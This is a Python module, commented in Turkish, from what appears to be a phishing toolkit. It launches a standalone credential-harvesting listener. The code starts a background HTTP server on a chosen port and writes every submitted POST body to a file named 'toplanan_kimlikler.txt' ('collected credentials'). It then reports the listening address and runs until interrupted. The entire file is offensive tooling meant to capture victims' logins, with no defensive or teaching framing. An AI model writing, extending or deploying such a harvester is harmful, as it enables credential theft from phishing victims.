#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
bağımsız kimlik bilgisi toplayıcı dinleyici.

herhangi bir oltalama sayfası olmaksızın gelen POST isteklerini
dinleyerek kimlik bilgilerini dosyaya kaydeder.
"""

from __future__ import annotations

import time
from typing import Optional

from .konsol import konsol
from .sunucu import DinleyiciSunucu, SunucuYonetici
from .yardimci import port_kontrol, port_sec_interaktif, varsayilan_ip_al, yerel_ip_al


# ────────────────────────────── modül bilgisi ──────────────────────────────

MODUL_BILGI = {
    "ad": "toplayıcı",
    "aciklama": "kimlik bilgisi toplayıcı dinleyici başlat",
    "giris_noktasi": "baslat",
    "komut": "toplayici",
}


# ────────────────────────────── ana başlatıcı ──────────────────────────────

def baslat(port: int = 8080, interaktif: Optional[bool] = None) -> None:
    """sadece POST isteklerini dinleyen bir sunucu başlatır.

    Args:
        port: dinlenecek port numarası
        interaktif: None ise CLI/interaktif modunu otomatik algılar
    """
    konsol.ayirici()
    konsol.vurgu("kimlik bilgisi toplayıcı")
    konsol.ayirici()

    # interaktif mod algılama
    if interaktif is None:
        # CLI'dan port verilmediyse interaktif
        interaktif = True

    if interaktif:
        port = port_sec_interaktif(port)
    elif not port_kontrol(port):
        konsol.hata(f"{port} portu zaten kullanılıyor.")
        return

    # sunucu başlat — statik dosya sunulmayacak
    yonetici = SunucuYonetici(
        port=port,
        kayit_dosyasi="toplanan_kimlikler.txt",
        sunucu_kok_dizini=None,
        yonlendirme_url=None,
    )

    yonetici.baslat(arka_plan=True)

    ip_adresi = varsayilan_ip_al()
    konsol.ayirici()
    konsol.basari(f"toplayıcı http://{ip_adresi}:{port} adresinde dinliyor")
    konsol.bilgi("gelen POST istekleri → 'toplanan_kimlikler.txt'")
    konsol.bilgi("durdurmak için Ctrl+C")
    konsol.ayirici()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        yonetici.durdur()